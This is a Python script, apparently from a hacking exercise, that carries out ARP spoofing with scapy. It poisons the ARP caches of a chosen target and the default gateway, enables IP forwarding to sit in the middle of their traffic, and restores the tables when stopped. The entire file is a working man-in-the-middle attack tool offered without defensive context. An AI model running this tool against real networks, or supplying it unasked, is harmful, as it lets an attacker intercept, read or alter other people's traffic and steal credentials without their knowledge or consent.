import ctypes

import scapy.all as scapy
import argparse
import network
import time
import os
import _thread


def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target",
                        dest="target",
                        help="Target IP of device to intercept, e.g. 10.0.2.4")

    args = parser.parse_args()
    if not args.target:
        parser.error("[-] Missing target! Please check --help")

    return args


def request_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    try:
        return answered_list[0][1].hwsrc
    except IndexError as e:
        print("[-] Could not request mac for ip ", ip)


def spoof(target_ip, spoof_ip, target_mac=None):
    if not target_mac:
        target_mac = request_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(target_ip, source_ip):
    target_mac = request_mac(target_ip)
    gateway_mac = request_mac(source_ip)

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=gateway_mac)
    scapy.send(packet, count=4, verbose=False)


def arp_spoofing(target):
    # Check the current net config to get the gateway info
    network_commands = network.NetworkCommands()
    ip_gateway = network_commands.find_gateway()
    mac_gateway = request_mac(ip_gateway)

    print("[+] Default gateway is", ip_gateway, "with", mac_gateway)

    # Get Target info
    mac_target = request_mac(target)

    print("[+] Target is", target, "with", mac_target)

    network_commands.set_ipv4_forwarding(True)

    keys = []
    _thread.start_new(input_thread, (keys,))
    print("[!]", "Press Enter to stop attack!")

    arp_counter = 0

    while True:
        spoof(ip_gateway, target, target_mac=mac_gateway)
        spoof(target, ip_gateway, target_mac=mac_target)

        arp_counter += 2

        print("\r[+] Send ARP " + str(arp_counter), end=" ", flush=True)

        time.sleep(2)

        if keys:
            break

    print("\n[-] Detected 'Enter' ... Resetting ARP tables")
    network_commands.set_ipv4_forwarding(False)
    restore(ip_gateway, target)
    restore(target, ip_gateway)


def input_thread(L):
    key = input()
    L.append(key)


def has_sudo_or_admin_rights():
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

    return is_admin


if __name__ == "__main__":
    arguments = parse_arguments()
    if not has_sudo_or_admin_rights():
        print("[-]", "No sudo/admin rights!")
    arp_spoofing(arguments.target)
